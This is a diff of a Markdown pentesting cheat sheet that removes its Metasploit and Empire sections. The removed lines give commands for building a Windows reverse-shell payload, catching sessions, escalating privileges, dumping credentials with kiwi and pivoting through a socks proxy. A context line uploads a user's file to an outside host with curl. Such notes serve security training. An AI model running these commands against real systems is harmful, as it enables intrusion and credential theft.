@@ -118,8 +118,6 @@
 - [HTTP](#http)
 - [Tips](#tips)
   - [list](#list)
-  - [Metasploit](#metasploit)
-  - [Empire](#empire)
   - [RDP admin](#rdp-admin)
   - [User-Name-List](#user-name-list)
   - [sheet](#sheet)
@@ -2071,60 +2069,6 @@ curl -X POST http://10.10.14.68:8000/upload -F 'files=@/home/lnorgaard/RT30000.z
 ## list
 ```bash
 for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
-```
-
-## Metasploit
-```bash
-# hundler
-msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
-## to base64 
-base64 -w0 shell.exe 
-# start handler
-use multi/handler
-## htm c2
-use exploit/windows/misc/hta_server
-# sessions
-sessions -l
-sessions -i 1
-
-# exploit suggest
-use post/multi/recon/local_exploit_suggester
-
-# privesc 
-getsystem
-migrate 
-
-load kiwi
-creds_all
-lsa_dump_sam
-
-# Port Forwading
-use multi/manage/autoroute
-
-use auxiliary/server/socks_proxy
-set SRVHOST 127.0.0.1
-set VERSION 5
-run -j
-jobs
-
-# other
-lcd /home/kali/Downloads
-lpwd
-download 
-upload
-```
-
-## Empire
-```bash
-# first
-listeners
-uselistener http
-
-usestager windows_launcher_vbs
-usestager windows_cmd_exec
-
-agents
-interact
 ```
 
 ## RDP admin
